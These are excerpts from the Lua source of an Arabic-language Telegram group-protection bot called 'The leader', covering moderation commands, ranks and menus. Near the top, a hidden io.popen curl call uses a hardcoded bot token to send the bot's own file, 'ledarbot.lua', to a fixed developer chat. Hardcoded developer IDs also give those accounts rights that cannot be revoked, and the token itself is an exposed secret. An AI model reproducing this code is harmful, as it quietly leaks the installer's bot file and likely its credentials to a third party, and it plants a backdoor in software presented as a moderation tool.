...
sudo_users = {SUDO,bot_id,1706461849,944353237,0000000000,0000000000}   
...
local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1706461849 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl) 
...
if tonumber(user_id) == tonumber(1706461849) then  
var = true  
...
local NameUser = "𖤍 بواسطه » ["..data.first_name_.."](T.me/"..UserName..")"
...
SourceDRAGONr = ' 𖤍 اهلا عزيزي\n 𖤍 انا بوت اسمي القائد\n 𖤍 اختصاصي حمايه الكروبات\n 𖤍 من تكرار والسبام والتوجيه والخ…\n 𖤍 لتفعيلي اتبع الاخطوات…↓\n 𖤍 اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط '
end 
...
send(msg.sender_user_id_, msg.id_,' 𖤍 تم ارسال رسالتك\n 𖤍 سيتم رد في اقرب وقت')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' 𖤍 تم ارسال الملصق من ↓\n - '..Name
...
local Text = ' 𖤍 المستخدم » '..Name..'\n 𖤍 تم حظره من التواصل'
...
send(msg.chat_id_, msg.id_,' 𖤍 تم حذف كليشه ستارت')
end
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'𖤍 لا يوجد كروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
usertext = '\n 𖤍 العضو » ['..result.title_..'](t.me/'..(username or 'theleader205')..')'
status  = '\n 𖤍 تم ترقيته مطور'
...
usertext = '\n 𖤍 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'theleader205')..')'
status  = '\n 𖤍 تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤍 العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'theleader205')..') \n 𖤍 '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," 𖤍 تمت الاذاعه الى >>{"..#list.."} كروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_,0," 𖤍 العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖤍 ["..DRAGON_Msg.."] \n")
else
send(msg.chat_id_,0," 𖤍 العضو : {["..data.first_name_.."](T.ME/theleader205)}\n 𖤍 ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " 𖤍 عذرا » {["..data.first_name_.."](T.ME/theleader205)}\n 𖤍 عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' 𖤍 عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' 𖤍 عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖤍 بالتأكيد تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n 𖤍 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖤍 تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
send(msg.chat_id_, msg.id_,' 𖤍 بالتأكيد تم تعطيل الجروب')
else
sendText(msg.chat_id_,'\n 𖤍 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖤍 تم تعطيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' 𖤍 تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n 𖤍 بواسطه » ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n 𖤍 تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_, '𖤍 تم تفعيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✔")
end
if text == "تعطيل الاضافات" and SudoBot(msg) then
send(msg.chat_id_, msg.id_, '𖤍 تم تعطيل الاضافات')
database:set(bot_id.."AL:AddS0FI:stats","✖")
end
...
send(msg.chat_id_, msg.id_, '𖤍 تم تفعيل تنبيه الصور')
...
send(msg.chat_id_, msg.id_, '𖤍 تم تعطيل تنبيه الصور')
...
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
[Eslam](t.me/XXx_EsLaM_xXX)
]] 
keyboard = {}  
keyboard.inline_keyboard = { {{text = 'ديف اسلام', url="t.me/XXx_EsLaM_xXX"}},} 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/XXx_EsLaM_xXX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 𖤍 بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'theleader205')..') \n 𖤍 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤍 بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'theleader205')..') \n 𖤍 تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(1706461849) then
...
if result.sender_user_id_ == tonumber(0000000000) then
send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر المطور حودا \n")
return false 
end
...
if result.id_ == tonumber(1706461849) then
send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر مطور السورس \n")
return false 
end
if result.id_ == tonumber(944353237) then
send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك حظر مطور السورس عام\n")
return false 
end
usertext = '\n 𖤍 العضو » ['..result.title_..'](t.me/'..(username or 'theleader205')..')'
status  = '\n 𖤍 تم حظره عام من الجروبات'
...
if tonumber(userid) == tonumber(1706461849) then  
...
if result.sender_user_id_ == tonumber(0000000000) then
send(msg.chat_id_, msg.id_, " 𖤍 لا يمكنك كتم المطور حودا\n")
return false 
end
if result.sender_user_id_ == tonumber(944353237) then
...
if Get_info then
local TextS = "\n 𖤍 اهلا بك في متجر ملفات القائد\n 𖤍 ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n 𖤍 علامة تعني { ✔️ } ملف مفعل\n 𖤍 علامة تعني { ✖ } ملف معطل\n 𖤍 قناة سورس القائد ↓\n".." 𖤍 [اضغط هنا لدخول](t.me/theleader205) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," 𖤍 عذرا الملف لايدعم سورس القائد \n") 
end
return false
end
...
if #list == 0 then
t = " 𖤍 لا يوجد احد في قائمه القائد"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
send(msg.chat_id_, msg.id_, "\n𖤍 تم مسح قائمة المطورين الثانويين  ")
end
------------------------------------------------------------------------
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖤍 لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'theleader205')..')'
status  = '\n 𖤍 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖤍 العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤍 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤍 تم رفع العضو متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤍 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'theleader205')..')'
status  = '\n 𖤍 تم تنزيل العضو متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_,"اهلا عزيزي \n تم رفع العضو بنجاح \n روحو اعملو واحد برايفت يقلب ❤️") 
return false 
end
if text == "بوت الحذف" then    
send(msg.chat_id_, msg.id_,"بوت الحذف \n @DTeLebot ") 
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤍 العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'theleader205')..')'
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤍 لا تسطيع تقييد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤍 عذرا لا تستطيع تقييد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤍 عذرا لا تستطيع تقييد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤍 العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'theleader205')..')'
status  = '\n 𖤍 تم تقييده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n 𖤍 عذرا لا تستطيع تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
local f = ' 𖤍 عدد البوتات التي هي ادمن >> {'..t..'}\n 𖤍 ملاحضه علامة ال (✯) تعني ان البوت ادمن \n'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖤍 العضو » ['..result.title_..'](t.me/'..(text1[3] or 'theleader205')..')'..'\n 𖤍 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,'𖤍تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,'𖤍 تم حذف {'..num..'}')  
...
send(msg.chat_id_, msg.id_,"𖤍 تم حذف الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_,"𖤍تم حذف ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_,' 𖤍 ارسل الكلمه التي تريد حذفها')
...
return send(msg.chat_id_, msg.id_,"𖤍ارسل الان الكلمه لحذفها ")
end
if text then  
...
send(msg.chat_id_, msg.id_,' 𖤍 تم مغادرة الجروب') 
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
end
return false  
end
...
send(msg.chat_id_, msg.id_,' 𖤍 رتبتك في البوت » '..rtp)
end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
...
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.id_
send(msg.chat_id_, msg.id_,' 𖤍 الايدي » ('..iduser..')\n 𖤍 المعرف » ('..username..')\n 𖤍 الرتبه » ('..rtp..')\n 𖤍 نوع الكشف » بالمعرف')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤍 المعرف غير صحيح')
end
...
if result.id_ then
send(msg.chat_id_, msg.id_,' 𖤍 تعال حبي يصيحونك بل كروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖤍 الشخص الذي قام باضافتك هو » '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤍 انت دخلت عبر الرابط ') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤍 تم تعطيل امر منو ضافني') 
end
end

if text == 'تفعيل ضافني' and Manager(msg) then   
if database:get(bot_id..'Added:Me'..msg.chat_id_) then
Text = ' 𖤍 تم تفعيل امر منو ضافني'
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = ' 𖤍 بالتاكيد تم تفعيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤍 تم تعطيل امر منو ضافني'
else
Text = '\n 𖤍 بالتاكيد تم تعطيل امر منو ضافني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = ' 𖤍 تم تفعيل امر اطردني'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖤍 بالتاكيد تم تفعيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤍 تم تعطيل امر اطردني'
else
Text = '\n 𖤍 بالتاكيد تم تعطيل امر اطردني'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
send(msg.chat_id_, msg.id_," 𖤍 تم تغير رد العضو الى » "..Teext)
end
...
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖤍 هاذا الامر خاص بالادمنيه\n 𖤍 ارسل {م10} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
...
*ٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ*
[☞ 𝗧 𝗛 𝗘  𝗟 𝗘 𝗔 𝗗 𝗘 𝗥 ☜ ](t.me/theleader205)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
t =[[
رابط الحذف في جميع مواقع التواصل 𖤍
فكر قبل لا تتسرع وتروح
ٴ⊰━━━━━━━━━━⊱ٴ
 𖤍 رابط حذف  [Telegram](https://my.telegram.org/auth?to=delete) ܁
 𖤍 رابط حذف [instagram](https://www.instagram.com/accounts/login/?next=/accounts/remove/request/permanent/) ܁
 𖤍 رابط حذف [Facebook](https://www.facebook.com/help/deleteaccount) ܁
 𖤍 رابط حذف [Snspchat](https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
𖤍 المحذوفين
•┉ • ┉ • ┉ 𝔏𝔈𝔄𝔇𝔈ℜ ┉ • ┉ • ┉•
𖤍 مسح  امر + الامر القديم  
•┉ • ┉ • ┉ 𝔏𝔈𝔄𝔇𝔈ℜ ┉ • ┉ • ┉•
𖤍 الاوامر المضافه ( لعرض الاوامر المضافه ) 
•┉ • ┉ • ┉ 𝔏𝔈𝔄𝔇𝔈ℜ ┉ • ┉ • ┉•
[☞ 𝗧 𝗛 𝗘  𝗟 𝗘 𝗔 𝗗 𝗘 𝗥 ☜ ](t.me/theleader205)
]]
keyboard = {} 
...
•┉ • ┉ • ┉ 𝔏𝔈𝔄𝔇𝔈ℜ ┉ • ┉ • ┉•
𖤍 استعاده الاوامر 
𖤍 تحويل كالاتي~⪼ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
𖤍 صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
𖤍 كشف القيود
𖤍 تعين الايدي
𖤍 تغير الايدي
...
send(msg.chat_id_, msg.id_,' 𖤍 تم حذف الامر')  
else
